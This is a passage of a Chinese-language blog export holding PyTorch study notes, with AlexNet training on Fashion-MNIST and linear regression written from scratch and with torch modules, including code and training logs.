class="hljs-number">0</span>.<span class="hljs-number">334</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">875</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">857</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">878</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">694</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">850</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">352</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">869</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">862</span><br><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">329</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">879</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">877</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">297</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">889</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">859</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">281</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">896</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">873</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">265</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">902</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">886</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">255</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">906</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">878</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">243</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">910</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">892</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AlexNet</title>
    <link href="/2023/11/20/ai/AlexNet/"/>
    <url>/2023/11/20/ai/AlexNet/</url>
    
    <content type="html"><![CDATA[<p>用的是fashion mnist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">1024</span> <span class="hljs-comment"># 书上写的128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()), <br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(batch_size,resize=<span class="hljs-number">224</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(train_iter),<span class="hljs-built_in">len</span>(test_iter))<br></code></pre></td></tr></table></figure><pre><code class="hljs">59 10</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># AlexNet</span><br>net = nn.Sequential(<br>    nn.Conv2d(<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,kernel_size=<span class="hljs-number">11</span>,stride=<span class="hljs-number">4</span>,padding=<span class="hljs-number">1</span>),<br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Conv2d(<span class="hljs-number">96</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>), <br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Conv2d(<span class="hljs-number">256</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>), <br>    nn.ReLU(),<br>    nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>), <br>    nn.ReLU(),<br>    nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Flatten(),<br>    nn.Linear(<span class="hljs-number">6400</span>, <span class="hljs-number">4096</span>), <br>    nn.ReLU(),<br>    nn.Dropout(p=<span class="hljs-number">0.5</span>),<br>    nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>), <br>    nn.ReLU(),<br>    nn.Dropout(p=<span class="hljs-number">0.5</span>),<br>    nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不重要，不用看</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;在n个变量上累加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter,device</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            X,y = X.to(device), y.to(device)<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch6</span>(<span class="hljs-params">net, trian_iter, test_iter, num_epochs, lr, device</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m)==nn.Linear <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(m)==nn.Conv2d:<br>            nn.init.xavier_uniform_(m.weight)<br>    net.apply(init_weights)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;training on&#x27;</span> , device)<br><br>    optimizer = torch.optim.SGD(net.parameters(), lr=lr)<br>    loss = nn.CrossEntropyLoss()<br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        metric = Accumulator(<span class="hljs-number">3</span>)<br>        net = net.to(device)<br>        net.train()<br>        <span class="hljs-keyword">for</span> i, (X,y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(train_iter)):<br>            start = time.time()<br>            optimizer.zero_grad() <span class="hljs-comment"># 上一轮的梯度归零</span><br>            X,y = X.to(device), y.to(device)<br>            y_hat = net(X)<br>            l = loss(y_hat,y)<br>            l.backward() <span class="hljs-comment"># 反向传播得到每个参数的梯度</span><br>            optimizer.step() <span class="hljs-comment"># 参数更新</span><br>            <span class="hljs-keyword">with</span> torch.no_grad():<br>                metric.add(l * X.shape[<span class="hljs-number">0</span>], accuracy(y_hat,y), X.shape[<span class="hljs-number">0</span>])<br>            train_l = metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>]<br>            train_acc = metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br>            test_acc = evaluate_accuracy(net, test_iter,device)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;loss <span class="hljs-subst">&#123;train_l:<span class="hljs-number">.3</span>f&#125;</span>, train acc <span class="hljs-subst">&#123;train_acc:<span class="hljs-number">.3</span>f&#125;</span>,&#x27;</span> <span class="hljs-string">f&#x27;test acc <span class="hljs-subst">&#123;test_acc:<span class="hljs-number">.3</span>f&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;metric[<span class="hljs-number">2</span>] * num_epochs / ( time.time() - start ) :<span class="hljs-number">.1</span>f&#125;</span> examples/sec &#x27;</span>  <span class="hljs-string">f&#x27;on <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(device)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">lr, num_epochs = <span class="hljs-number">0.01</span>, <span class="hljs-number">10</span><br>train_ch6(net, train_iter, test_iter, num_epochs, lr, <span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">training on cuda:059it [02:46,  2.83s/it]loss 2.283, train acc 0.256,test acc 0.328211869.9 examples/sec on cuda:0</code></pre><p>​<br>​    59it [02:48,  2.86s/it]<br>​<br>​    loss 1.832, train acc 0.430,test acc 0.549<br>​    230051.2 examples/sec on cuda:0</p><p>​<br>​    59it [02:52,  2.92s/it]<br>​<br>​    loss 1.085, train acc 0.596,test acc 0.598<br>​    233088.3 examples/sec on cuda:0</p><p>​<br>​    59it [02:44,  2.79s/it]<br>​<br>​    loss 0.885, train acc 0.666,test acc 0.701<br>​    221954.7 examples/sec on cuda:0</p><p>​<br>​    59it [02:41,  2.74s/it]<br>​<br>​    loss 0.787, train acc 0.703,test acc 0.743<br>​    226613.6 examples/sec on cuda:0</p><p>​<br>​    59it [02:46,  2.82s/it]<br>​<br>​    loss 0.712, train acc 0.730,test acc 0.738<br>​    214793.3 examples/sec on cuda:0</p><p>​    59it [02:50,  2.90s/it]<br>​    </p><pre><code class="hljs">loss 0.668, train acc 0.751,test acc 0.727228293.3 examples/sec on cuda:0</code></pre><p>​    53it [02:28,  2.83s/it]</p>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linear regression</title>
    <link href="/2023/11/19/ai/linear%20regression/"/>
    <url>/2023/11/19/ai/linear%20regression/</url>
    
    <content type="html"><![CDATA[<h3 id="1-自己写loss-optim-nn-Sequential-dataloader"><a href="#1-自己写loss-optim-nn-Sequential-dataloader" class="headerlink" title="1  自己写loss optim nn.Sequential dataloader"></a>1  自己写loss optim nn.Sequential dataloader</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">synthetic_data</span>(<span class="hljs-params">w,b,num_examples</span>):<br>    X = torch.normal(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(num_examples, <span class="hljs-built_in">len</span>(w)))<br>    y = torch.matmul(X,w) + b<br>    y += torch.normal(<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>,y.shape)<br>    <span class="hljs-keyword">return</span> X, y.reshape((-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">true_w = torch.tensor([<span class="hljs-number">2</span>,-<span class="hljs-number">3.4</span>], dtype=torch.<span class="hljs-built_in">float</span>)<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;features:&#x27;</span>, features[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;\nlabel:&#x27;</span>, labels[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(features.size(),labels.size())<br></code></pre></td></tr></table></figure><pre><code class="hljs">features: tensor([ 0.9487, -1.4700]) label: tensor([11.1058])torch.Size([1000, 2]) torch.Size([1000, 1])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">d2l.set_figsize()<br>d2l.plt.scatter(features[:,(<span class="hljs-number">1</span>)].detach().numpy(), labels.detach().numpy(), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">&lt;matplotlib.collections.PathCollection at 0x253ff824790&gt;</code></pre><p>​<br><img src="/img/linear%20regression_files/linear%20regression_3_1.svg" alt="svg"><br>​    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_iter</span>(<span class="hljs-params">batch_size, features, labels</span>): <br>    num_examples = <span class="hljs-built_in">len</span>(features) <span class="hljs-comment"># 1000</span><br>    indices = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(num_examples)) <br>    random.shuffle(indices)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, num_examples, batch_size):<br>        batch_indices = torch.tensor(indices[i: <span class="hljs-built_in">min</span>(i+batch_size, num_examples)])<br>        <span class="hljs-keyword">yield</span> features[batch_indices], labels[batch_indices]<br>batch_size = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> X,y <span class="hljs-keyword">in</span> data_iter(batch_size, features, labels):<br>    <span class="hljs-built_in">print</span>(X, <span class="hljs-string">&#x27;\n&#x27;</span>, y)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">tensor([[ 0.4883, -0.0929],        [ 0.4926,  0.9515],        [ 0.8701, -1.2666],        [-1.8409,  1.4006],        [ 0.6684, -1.6310],        [ 1.0021, -0.7984],        [ 0.0086, -0.8899],        [-0.8791,  0.2551],        [-0.0785,  0.6714],        [ 0.6666, -0.6967]])  tensor([[ 5.4957],        [ 1.9405],        [10.2555],        [-4.2457],        [11.0663],        [ 8.9186],        [ 7.2409],        [ 1.5641],        [ 1.7715],        [ 7.9071]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">w = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.zeros(<span class="hljs-number">1</span>, requires_grad=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">linreg</span>(<span class="hljs-params">X, w, b</span>):<br>    <span class="hljs-keyword">return</span> torch.matmul(X,w) + b<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">squared_loss</span>(<span class="hljs-params">y_hat, y</span>):<br>    <span class="hljs-keyword">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class="hljs-number">2</span> / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sgd</span>(<span class="hljs-params">params, lr, batch_size</span>):<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> params:<br>            param -= lr * param.grad /batch_size<br>            param.grad.zero_()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lr = <span class="hljs-number">0.03</span><br>num_epochs = <span class="hljs-number">3</span><br>net = linreg<br>loss = squared_loss<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X,y <span class="hljs-keyword">in</span> data_iter(batch_size, features, labels):<br>        l = loss(net(X,w,b),y)<br>        l.<span class="hljs-built_in">sum</span>().backward()<br>        sgd([w,b] , lr, batch_size)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        train_l = loss(net(features, w, b), labels)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;<span class="hljs-built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.027771epoch 2, loss 0.000104epoch 3, loss 0.000055</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;w的估计误差: <span class="hljs-subst">&#123;true_w - w.reshape(true_w.shape)&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b的估计误差: <span class="hljs-subst">&#123;true_b - b&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">w的估计误差: tensor([ 0.0012, -0.0005], grad_fn=&lt;SubBackward0&gt;)b的估计误差: tensor([0.0006], grad_fn=&lt;RsubBackward1&gt;)</code></pre><h3 id="2-全部换成pytorch"><a href="#2-全部换成pytorch" class="headerlink" title="2 全部换成pytorch"></a>2 全部换成pytorch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">true_w = torch.tensor([<span class="hljs-number">2</span>, -<span class="hljs-number">3.4</span>])<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = d2l.synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br><span class="hljs-built_in">print</span>(features.shape, labels.shape)<br></code></pre></td></tr></table></figure><pre><code class="hljs">torch.Size([1000, 2]) torch.Size([1000, 1])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_array</span>(<span class="hljs-params">data_arrays, batch_size ,is_train=<span class="hljs-literal">True</span></span>):<br>    dataset = data.TensorDataset(*data_arrays)<br>    <span class="hljs-keyword">return</span> data.DataLoader(dataset, batch_size, shuffle=is_train)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">batchsize = <span class="hljs-number">10</span><br>data_iter = load_array((features, labels), batchsize)<br><span class="hljs-built_in">next</span>(<span class="hljs-built_in">iter</span>(data_iter))<br></code></pre></td></tr></table></figure><pre><code class="hljs">[tensor([[ 0.5940, -1.2375],         [-0.0840, -0.2979],         [-0.6866, -0.0931],         [-0.7088,  1.3270],         [ 1.0423,  0.6539],         [ 0.8156,  0.4527],         [ 0.5195, -0.3563],         [ 1.5992, -0.2122],         [ 0.9235,  0.7968],         [ 1.7633,  1.0517]]), tensor([[ 9.6162],         [ 5.0296],         [ 3.1477],         [-1.7288],         [ 4.0441],         [ 4.2969],         [ 6.4594],         [ 8.1204],         [ 3.3252],         [ 4.1758]])]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br>net = nn.Sequential(nn.Linear(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<br>net[<span class="hljs-number">0</span>].weight.data.normal_(<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>)<br>net[<span class="hljs-number">0</span>].bias.data.fill_(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">tensor([0.])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.MSELoss()<br>trainer = torch.optim.SGD(net.parameters(), lr = <span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>        l = loss(net(X) ,y)<br>        trainer.zero_grad()<br>        l.backward()<br>        trainer.step()<br>    l = loss(net(features), labels)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;l:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.000310epoch 2, loss 0.000098epoch 3, loss 0.000098</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w = net[<span 